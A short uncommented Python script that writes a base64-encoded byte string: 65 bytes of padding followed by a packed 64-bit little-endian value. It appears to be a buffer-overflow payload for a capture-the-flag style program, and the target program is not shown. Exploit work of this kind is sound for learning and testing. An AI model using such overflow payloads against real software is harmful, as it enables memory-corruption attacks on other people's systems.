
import sys
import struct
import base64

buf = b'sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'
buf += struct.pack('<Q', 11317552659554863401)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
